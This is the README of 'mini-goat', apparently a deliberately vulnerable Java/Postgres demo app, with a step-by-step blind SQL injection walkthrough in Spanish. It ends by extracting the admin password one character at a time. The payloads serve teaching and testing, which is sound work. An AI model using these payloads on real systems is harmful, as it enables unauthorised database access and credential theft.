# mini-goat

A simple Java application to test and demonstrate SQL Injections.

## Installation

It's a web-app made with SpringMVC and Postgres. Should be easily setup.

## Injections

1. comprobamos que es un like:

    a
    b

2. verificamos que podemos obtener un verdadero distinguible

    pipo' and '1' like '1

3. verificamos que podemos obtener un falso distinguible

    pipo' and '1' like '2

4. verificamos que la tabla se llama "usuarios"

    pipo' or exists (select 1 from usuarios) and '1' like '1

4.1. por una falla de configuración, si erramos el nombre de la tabla, tenemos un error

    pipo' or exists (select 1 from usuario) and '1' like '1

5. verificamos que hay un campo password

    pipo' or exists (select 1 from usuarios where password = password) and '1' like '1

6. verificamos que existe efectivamente el usuario admin

    pipo' or exists (select 1 from usuarios where password = password and username = 'admin') and '1' like '1

7. vemos el largo de la contraseña

pipo' or exists (select 1 from usuarios where length(password) > 0 and username = 'admin') and '1' like '1

8. vemos con qué letra empieza la contraseña

pipo' or exists (select 1 from usuarios where substring(password, 1, 1) < 'z' and username = 'admin') and '1' like '1

9. vemos con qué letra sigue la contraseña

pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) < 'z' and username = 'admin') and '1' like '1

10. así sucesivamente, hasta sacar todos los caracteres de la contraseña

pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) = '2' and substring(password, 3, 1) = '3' and substring(password, 4, 1) = '4' and username = 'admin') and '1' like '1
